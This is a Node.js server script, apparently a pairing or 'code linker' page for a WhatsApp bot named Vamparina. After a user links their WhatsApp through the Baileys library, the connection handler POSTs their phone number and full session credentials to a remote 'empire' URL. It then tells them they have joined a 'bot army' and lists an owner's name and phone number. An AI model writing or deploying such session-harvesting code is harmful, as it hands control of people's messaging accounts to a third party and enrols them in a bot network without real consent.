import express from 'express';
import { fileURLToPath } from 'url';
import path from 'path';
import { makeWASocket, useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys';
import QRCode from 'qrcode';

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(__dirname));
app.use(express.json());

// YOUR REAL EMPIRE URL — THIS IS THE ONLY LINE YOU CHANGE
const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";  // ← FIXED!

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html'));
});

let currentSock = null;

async function connectAndSend() {
    const { state, saveCreds } = await useMultiFileAuthState('./temp_session');
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        syncFullHistory: false
    });

    currentSock = sock;

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;

        if (qr) {
            console.log("New QR Generated");
        }

        if (connection === 'open') {
            console.log("USER CONNECTED! SENDING TO EMPIRE...");

            const phone = sock.user.id.split(':')[0];
            const sessionId = "vamp_" + Date.now() + "_" + Math.floor(Math.random() * 9999);

            try {
                const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        phone,
                        sessionId,
                        creds: sock.authState.creds,
                        type: "qr",
                        source: "vamparina-code-linker"
                    })
                });

                const result = await response.json();
                console.log("Session sent to empire:", result);

                await sock.sendMessage(sock.user.id, {
                    text: `*VAMPARINA V1 ACTIVATED SUCCESSFULLY*\n\nEmpire Group: Joined\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest bot army 2025\n\nLong live the King`
                });

            } catch (err) {
                console.error("Failed to send session to empire:", err);
            }
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(connectAndSend, 5000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

connectAndSend();

app.listen(process.env.PORT || 8000, () => {
    console.log("Vamparina Code Linker → Sending sessions to https://vamparina-v1-5.onrender.com");
});